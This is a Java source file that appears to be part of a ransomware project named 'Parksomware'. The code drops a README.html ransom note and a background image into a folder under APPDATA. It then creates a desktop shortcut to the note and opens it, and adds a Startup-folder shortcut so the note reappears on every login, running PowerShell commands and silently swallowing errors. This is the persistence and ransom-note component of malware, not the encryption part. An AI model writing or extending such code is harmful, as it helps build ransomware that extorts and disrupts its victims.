package kr.pah;

import java.awt.*;
import java.io.*;
import java.nio.file.*;

public class CreateReadme {

    private static final String PARKSOMWARE_DIR = System.getenv("APPDATA") + "\\Parksomware";

    public static void main() {
        try {
            Path parksomwarePath = Paths.get(PARKSOMWARE_DIR);
            if (!Files.exists(parksomwarePath)) {
                Files.createDirectories(parksomwarePath);
            }

            Path readmePath = extractResourceToFile("/README.html", PARKSOMWARE_DIR);
            Path backgroundPath = extractResourceToFile("/background.png", PARKSOMWARE_DIR);
            addToDesktopShortcut(readmePath);
            addToStartup(readmePath);
        } catch (Exception ignored) {
        }
    }

    private static Path extractResourceToFile(String resourceFileName, String targetDirectory) throws IOException {
        Path filePath = Paths.get(targetDirectory, resourceFileName.substring(resourceFileName.lastIndexOf("/") + 1));
        try (InputStream is = CreateReadme.class.getResourceAsStream(resourceFileName)) {
            if (is == null) {
                throw new FileNotFoundException(resourceFileName + " not found in Jar file.");
            }
            Files.copy(is, filePath, StandardCopyOption.REPLACE_EXISTING);
        }
        return filePath;
    }

    private static void addToDesktopShortcut(Path filePath) {
        try {
            Path desktopPath = Paths.get(System.getProperty("user.home"), "Desktop");
            Path shortcutPath = desktopPath.resolve(filePath.getFileName().toString() + ".lnk");

            String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath + "'); "
                    + "$s.TargetPath = '" + filePath + "'; $s.Save()\"";
            Process process = Runtime.getRuntime().exec(script);

            int attempts = 0;
            while (!Files.exists(shortcutPath) && attempts < 10) {
                Thread.sleep(500);
                attempts++;
            }

            if (Files.exists(shortcutPath)) {
                if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.OPEN)) {
                    Desktop.getDesktop().open(shortcutPath.toFile());
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static void addToStartup(Path filePath) {
        try {
            String startupFolderPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
            Path shortcutPath = Paths.get(startupFolderPath, filePath.getFileName().toString() + ".lnk");

            String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath.toString() + "'); "
                    + "$s.TargetPath = '" + filePath.toString() + "'; $s.Save()\"";

            Process process = Runtime.getRuntime().exec(script);
        } catch (Exception ignored) {
        }
    }
}
